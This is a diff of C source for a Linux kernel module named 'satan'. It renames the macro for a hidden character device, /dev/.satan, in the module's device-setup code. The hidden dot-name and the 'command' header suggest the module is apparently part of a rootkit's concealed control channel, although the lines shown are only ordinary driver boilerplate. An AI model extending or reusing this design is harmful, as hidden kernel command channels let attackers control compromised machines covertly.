@@ -10,9 +10,8 @@
 
 #include "command.h"
 
-#define DEVICE_NAME ".satan"
-#define CDEV_BUF_SIZE 128 
 
+#define CDEV_BUF_SIZE 128 
 
 static struct satan_cdev {
         dev_t num;  // holds device (major, minor)
@@ -47,7 +46,7 @@ int satan_cdev_init(struct module *m)
         satan_cdev.f_op.read = satan_cdev_read;
        
 
-        ret = alloc_chrdev_region(&(satan_cdev.num), 0, 1, DEVICE_NAME);
+        ret = alloc_chrdev_region(&(satan_cdev.num), 0, 1, SATAN_CDEV_NAME);
         if (ret != 0) {
                 pr_alert("satan: cdev: failed to allocate a major number for device file\n");
                 goto out;
@@ -68,7 +67,7 @@ int satan_cdev_init(struct module *m)
 
 
         // Create /sys/class/.satan in preparation of creating /dev/.satan
-        satan_cdev.class = class_create(m, DEVICE_NAME);
+        satan_cdev.class = class_create(m, SATAN_CDEV_NAME);
 
         if (IS_ERR(satan_cdev.class)) {
                 pr_alert("satan: cdev: failed to create class\n");
@@ -80,8 +79,8 @@ int satan_cdev_init(struct module *m)
 
 
         // Create /dev/.satan for this char dev
-        if (IS_ERR(dev = device_create(satan_cdev.class, NULL, satan_cdev.num, NULL, DEVICE_NAME))) {
-                pr_alert("satan: cdev: failed to create /dev/%s\n", DEVICE_NAME);
+        if (IS_ERR(dev = device_create(satan_cdev.class, NULL, satan_cdev.num, NULL, SATAN_CDEV_NAME))) {
+                pr_alert("satan: cdev: failed to create /dev/%s\n", SATAN_CDEV_NAME);
                 ret = -1;
                 goto out;
         }
